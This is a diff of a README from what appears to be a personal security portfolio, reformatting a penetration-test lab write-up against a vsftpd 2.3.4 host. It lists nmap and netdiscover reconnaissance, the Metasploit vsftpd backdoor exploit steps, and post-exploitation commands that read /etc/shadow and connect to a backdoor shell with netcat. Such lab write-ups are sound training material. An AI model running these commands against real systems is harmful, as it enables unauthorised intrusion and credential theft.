@@ -16,28 +16,35 @@ Performed a full penetration test lifecycle: reconnaissance, scanning, vulnerabi
 - ✅ Exploitation via Metasploit Framework
 - ✅ Brute force attacks with Hydra
 
-Commands:
->Phase 1 — Reconnaissance
-- sudo netdiscover -r $HOST -i eth0
-- sudo nmap $HOST                          # basic scan
-- sudo nmap -T5 -sV $HOST                  # version detection
-- sudo nmap --script=vuln -p 21 $HOST      # vulnerability confirmation
+**Commands:**
 
->Phase 2 — Exploitation
-- msfconsole
-- msf6 > search vsftpd
-- msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
-- msf6 > set RHOSTS $HOST
-- msf6 > run
+**Phase 1 — Reconnaissance**
+```bash
+sudo netdiscover -r $HOST/24 -i eth0
+sudo nmap $HOST                          # basic scan
+sudo nmap -T5 -sV $HOST                  # version detection
+sudo nmap --script=vuln -p 21 $HOST      # vulnerability confirmation
+```
 
->Phase 3 — Post-Exploitation
-- whoami
-- hostname
-- pwd
-- ls /
-- cat /etc/shadow
-- nc $HOST 1524                            
+**Phase 2 — Exploitation**
+```bash
+msfconsole
+msf6 > search vsftpd
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > set RHOSTS $HOST
+msf6 > run
+```
 
+**Phase 3 — Post-Exploitation**
+```bash
+whoami
+hostname
+pwd
+ls /
+cat /etc/shadow
+nc $HOST 1524                            # secondary backdoor
+```
+                       
 **nmap version scan — identifying vsftpd 2.3.4**
 <br><img width="610" height="165" alt="image" src="https://github.com/user-attachments/assets/d3ff4093-4ccb-429f-9ce7-41f16b4d0dc2" />
 
@@ -47,8 +54,6 @@ Commands:
 **metasploit — root shell obtained**
 <br><img width="550" height="165" alt="image" src="https://github.com/user-attachments/assets/5338c658-d205-43ff-83bb-1a3d9842fba4" />
 <br><img width="611" height="222" alt="image" src="https://github.com/user-attachments/assets/5a2bb5d0-0543-47ba-8c73-fb09a3521b5d" />
-
-
 
 > 📄 **[Download Full Lab Report (PDF)](https://github.com/jaalso/cybersecurity-portfolio/raw/main/Pentest_Lab_Writeup_protected.pdf)**
 <br>🔒 Password protected — contact me via [LinkedIn](https://linkedin.com/in/jaalso) to request access
